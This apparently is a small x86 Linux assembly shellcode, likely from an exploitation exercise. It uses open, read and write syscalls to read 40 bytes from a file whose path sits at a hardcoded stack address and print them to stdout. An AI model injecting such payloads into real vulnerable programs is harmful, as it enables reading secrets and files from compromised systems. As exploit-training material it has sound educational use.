;name  | %eax | %ebx | %ecx | %edx
;open  | 0x05 | ptr  | flag | mode
;read  | 0x03 | fd   | buf  | size
;write | 0x04 | fd   | buf  | size
global _start

%define stack_addr 0xffffd650

_start:
    mov eax, 0x5 
    mov ebx, stack_addr
    xor ecx, ecx
    int 0x80
    mov ebx, eax
    mov eax, 0x3
    mov ecx, stack_addr
    mov edx, 0x28
    int 0x80
    mov eax, 0x04
    mov ebx, 0x1
    mov ecx, stack_addr
    mov edx, 0x28
    int 0x80
